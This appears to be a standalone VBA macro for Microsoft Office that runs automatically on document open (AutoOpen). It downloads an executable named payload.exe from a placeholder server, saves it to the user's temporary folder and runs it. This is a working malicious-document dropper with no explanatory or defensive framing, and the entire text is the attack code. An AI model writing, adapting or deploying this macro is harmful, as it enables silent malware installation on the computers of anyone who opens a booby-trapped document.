Sub AutoOpen()
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    Dim strFilePath As String
    
    strFilePath = Environ("TEMP") & "\payload.exe"
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")
    
    objXMLHTTP.Open "GET", "http://your-server/payload.exe", False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.responseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile strFilePath, 2
        objADOStream.Close
        CreateObject("WScript.Shell").Run strFilePath
    End If
End Sub
